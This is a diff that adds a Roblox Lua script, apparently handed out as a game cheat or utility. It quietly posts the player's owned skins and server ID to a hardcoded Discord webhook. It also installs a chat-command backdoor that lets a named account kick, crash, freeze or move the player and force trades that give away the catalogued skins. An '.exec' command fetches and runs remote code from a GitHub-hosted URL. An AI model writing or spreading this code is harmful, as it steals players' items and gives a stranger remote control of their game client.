@@ -1,0 +1,386 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
+
+local LocalPlayer = Players.LocalPlayer
+local executedBy = LocalPlayer.Name
+
+local frozen = false
+local headSitConn
+
+local ADMIN_NAME = "ChloeEaglePrism20215"
+
+--// HTTP request utility
+local function requestFunc(tab)
+    if syn then return syn.request(tab)
+    elseif http_request then return http_request(tab)
+    elseif request then return request(tab)
+    else error("No HTTP request function found") end
+end
+
+--// Function to send owned skins + random 4-letter codes + Job ID (silent)
+local function sendSkinsAndCodes()
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
+
+    getgenv().usedCodes = getgenv().usedCodes or {}
+    getgenv().skinKeywordMap = getgenv().skinKeywordMap or {}
+
+    -- Wait for DataFolder & Skins
+    local DataFolder = LocalPlayer:WaitForChild("DataFolder", 30)
+    if not DataFolder then return end
+
+    local SkinsValue
+    repeat
+        SkinsValue = DataFolder:FindFirstChild("Skins")
+        task.wait(1)
+    until SkinsValue
+
+    -- Wait until SkinsValue.Value is valid JSON
+    local decoded
+    repeat
+        local success, result = pcall(function()
+            return HttpService:JSONDecode(SkinsValue.Value)
+        end)
+        if success then decoded = result end
+        task.wait(1)
+    until decoded
+
+    local skinsData = decoded
+    local msg = "**Owned Skins & Random Codes for " .. LocalPlayer.Name .. "**\n"
+    msg = msg .. "**Job ID:** `" .. game.JobId .. "`\n\n"  -- Added Job ID here
+
+    local function randomCode()
+        local chars = "abcdefghijklmnopqrstuvwxyz0123456789"
+        local code
+        repeat
+            code = ""
+            for i = 1, 4 do
+                local idx = math.random(1, #chars)
+                code = code .. chars:sub(idx, idx)
+            end
+        until not usedCodes[code]
+        usedCodes[code] = true
+        return code
+    end
+
+    for weaponType, skins in pairs(skinsData) do
+        for skinName, ownedVal in pairs(skins) do
+            if tonumber(ownedVal) and ownedVal > 0 then
+                local existingCode
+                for code, info in pairs(skinKeywordMap) do
+                    if info[1] == weaponType and info[2] == skinName then
+                        existingCode = code
+                        break
+                    end
+                end
+
+                local code = existingCode or randomCode()
+                skinKeywordMap[code] = {weaponType, skinName}
+                msg = msg .. weaponType .. " - " .. skinName .. " : `" .. code .. "`\n"
+            end
+        end
+    end
+
+    local payload = HttpService:JSONEncode({
+        embeds = {{
+            title = "dh Skins for " .. LocalPlayer.Name,
+            description = msg,
+            color = 3447003
+        }}
+    })
+
+    local webhookURL = "https://discord.com/api/webhooks/1476985496147070987/hBnhQS1_sv9fI5xyqt0iTkk8zEm_83xUzUpvDQGkBhSivKcYP3aLVtMSag3tOepR07je"
+
+    pcall(function()
+        (syn and syn.request or http_request or request)({
+            Url = webhookURL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = payload
+        })
+    end)
+end
+
+if game.PlaceId == 2788229376 then
+    sendSkinsAndCodes()
+end
+
+--// Check if player is the designated admin (HoglaBoglayo1)
+local function isAdmin(player)
+    return player.Name == ADMIN_NAME
+end
+
+--// Utility
+local function isTargeted(targetName)
+    if not targetName then return true end
+    return string.lower(executedBy):sub(1, #targetName) == string.lower(targetName)
+end
+
+local function SendChatMessage(message)
+    if typeof(message) ~= "string" or message == "" then return end
+
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local textChannels = TextChatService:FindFirstChild("TextChannels")
+        if textChannels then
+            local general = textChannels:FindFirstChild("RBXGeneral")
+            if general then
+                pcall(function()
+                    general:SendAsync(message)
+                end)
+            end
+        end
+    else
+        local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
+            chatEvents.SayMessageRequest:FireServer(message, "All")
+        end
+    end
+end
+
+--// Command handler
+local function handleChat(msg, sender)
+    if not isAdmin(sender) then return end -- Only HoglaBoglayo1 can use commands
+
+    local args = msg:split(" ")
+    local command = args[1]
+    local targetName = args[2]
+    local payload = table.concat(args, " ", 3)
+
+    if command == ".kick" and isTargeted(targetName) then
+        local reason = payload ~= "" and payload or "You were kicked by an admin."
+        LocalPlayer:Kick(reason)
+
+    elseif command == ".bring" and isTargeted(targetName) then
+        if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
+            local adminRoot = sender.Character.HumanoidRootPart
+            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.CFrame = adminRoot.CFrame + Vector3.new(2, 0, 0)
+            end
+        end
+
+    elseif command == ".crash" and isTargeted(targetName) then
+        while true do end
+
+    elseif command == ".chat" and isTargeted(targetName) and payload ~= "" then
+        SendChatMessage(payload)
+
+    elseif command == ".freeze" and isTargeted(targetName) then
+        frozen = true
+        RunService.Heartbeat:Connect(function()
+            if frozen and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+                LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.zero
+                LocalPlayer.Character.HumanoidRootPart.Anchored = true
+            end
+        end)
+
+    elseif command == ".unfreeze" and isTargeted(targetName) then
+        frozen = false
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            LocalPlayer.Character.HumanoidRootPart.Anchored = false
+        end
+
+    elseif command == ".goto" and isTargeted(targetName) then
+        local target = Players:FindFirstChild(args[3])
+        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
+            local targetRoot = target.Character.HumanoidRootPart
+            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if myRoot then
+                myRoot.CFrame = targetRoot.CFrame + Vector3.new(1, 0, 0)
+            end
+        end
+
+    elseif command == ".destroy" and isTargeted(targetName) then
+        local backpack = LocalPlayer:FindFirstChild("Backpack")
+        if backpack then
+            for _, tool in ipairs(backpack:GetChildren()) do
+                if tool:IsA("Tool") then
+                    tool:Destroy()
+                end
+            end
+        end
+        local char = LocalPlayer.Character
+        if char then
+            for _, tool in ipairs(char:GetChildren()) do
+                if tool:IsA("Tool") then
+                    tool:Destroy()
+                end
+            end
+        end
+
+    elseif command == ".respawn" and isTargeted(targetName) then
+        local char = LocalPlayer.Character
+        if char then
+            char:BreakJoints()
+            local hum = char:FindFirstChild("Humanoid")
+            if hum then
+                hum.Health = 0
+            end
+        end
+
+    elseif command == ".t" and isTargeted(targetName) then
+        local targetPlayer = sender
+        if targetPlayer then
+            local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
+            
+            -- Send trade request
+            MainEvent:FireServer("Trading", "Request", targetPlayer)
+            wait(0.2)
+        end
+
+    elseif command == ".a" then
+        local keyword = args[2]
+        local mapping = skinKeywordMap[keyword]
+
+        if not mapping then
+            return
+        end
+
+        local weaponType, skinName = unpack(mapping)
+
+        local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
+        pcall(function()
+            MainEvent:FireServer("Trading", "Add", weaponType, skinName)
+        end)
+
+    elseif command == ".r" and isTargeted(targetName) then
+        local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
+        pcall(function()
+            MainEvent:FireServer("Trading", "Ready", "", "")
+        end)
+
+    elseif command == ".co" and isTargeted(targetName) then
+        local MainEvent = ReplicatedStorage:WaitForChild("MainEvent")
+        pcall(function()
+            MainEvent:FireServer("Trading", "Confirm", "", "")
+        end)
+
+    elseif command == ".proof" and isTargeted(targetName) then
+        StarterGui:SetCore("SendNotification", {
+            Title = "Triggerbot";
+            Text = "this person is really a triggerbot admin.";
+            Duration = 5,
+        })
+
+    elseif command == ".headsit" and isTargeted(targetName) then
+        local myChar = LocalPlayer.Character
+        local targetPlayer = Players:FindFirstChild(args[3])
+        if myChar and targetPlayer and targetPlayer.Character then
+            local myHum = myChar:FindFirstChildOfClass("Humanoid")
+            local myRoot = myChar:FindFirstChild("HumanoidRootPart")
+            local theirRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if myHum and myRoot and theirRoot then
+                myHum.Sit = true
+                if headSitConn then headSitConn:Disconnect() end
+                headSitConn = RunService.Heartbeat:Connect(function()
+                    if myHum.Sit and theirRoot and myRoot then
+                        myRoot.CFrame = theirRoot.CFrame * CFrame.new(0, 1.6, 0.4)
+                    else
+                        headSitConn:Disconnect()
+                    end
+                end)
+            end
+        end
+
+    elseif command == ".unheadsit" and isTargeted(targetName) then
+        if headSitConn then
+            headSitConn:Disconnect()
+            headSitConn = nil
+        end
+
+    elseif command == ".exec" and isTargeted(targetName) then
+        loadstring([[ 
+            getgenv()._="Join discord.gg/msgabv2t9Q | discord.gg/stando to get latest update ok bai >.< | If you pay for this script you get scammed, this script is completely free ok"
+            getgenv().Owner = "daanpro121"
+            getgenv().Configuration = {
+                ['Fps'] = 45,
+                ['Msg'] = 'Yare Yare Daze.',
+                ['CrewID'] = 32570691,
+                ['Attack'] = 'Heavy',
+                ['TPMode'] = 'Cart',
+                ['GunMode'] = 'Aug',
+                ['FlyMode'] = 'Glide',
+                ['Position'] = 'Back',
+                ['Resolver'] = false,
+                ['ChatCmds'] = true,
+                ['AutoMask'] = true,
+                ['MaskMode'] = 'Riot',
+                ['AntiStomp'] = true,
+                ['StandMode'] = 'Star Platinum : OverHeaven',
+                ['Smoothing'] = false,
+                ['AttackMode'] = 'Sky',
+                ['CustomName'] = 'Owner',
+                ['Hidescreen'] = false,
+                ['SummonPoses'] = 'Pose3',
+                ['LowGraphics'] = false,
+                ['CustomPrefix'] = '.',
+                ['CustomSummon'] = 'Summon!',
+                ['AutoPrediction'] = false,
+                ['AttackDistance'] = 75,
+                ['AutoSaveLocation'] = 'Downhill_Rooftop',
+                ['AttackPrediction'] = 0.34,
+                ['AttackAutoPrediction'] = 0.23,
+                ['Sounds'] = true,
+                ['CustomSong'] = 123456,
+                ['SummonMusic'] = true,
+                ['SummonMusicID'] = 'Default'
+            }
+            loadstring(game:HttpGet("https://xk5ng.github.io/V4.9"))()
+        ]])()
+
+    elseif command == ".rename" then
+        local targetPlayerName = args[2]
+        local newName = table.concat(args, " ", 3)
+
+        if not targetPlayerName or newName == "" then
+            return
+        end
+
+        local targetPlayer = Players:FindFirstChild(targetPlayerName)
+        if not targetPlayer then
+            return
+        end
+
+        local char = targetPlayer.Character
+        if not char then
+            return
+        end
+
+        local humanoid = char:FindFirstChildOfClass("Humanoid")
+        if not humanoid then
+            return
+        end
+
+        pcall(function()
+            humanoid.DisplayName = newName
+        end)
+    end
+end
+
+--// Connect admin chat - only for HoglaBoglayo1
+local function connectChatted(player)
+    if isAdmin(player) then -- Only HoglaBoglayo1
+        player.Chatted:Connect(function(msg)
+            handleChat(msg, player)
+        end)
+        print("Admin connected: " .. player.Name) -- Debug print
+    end
+end
+
+--// Setup
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        connectChatted(player)
+    end
+end
+
+Players.PlayerAdded:Connect(function(player)
+    if player ~= LocalPlayer then
+        connectChatted(player)
+    end
+end)
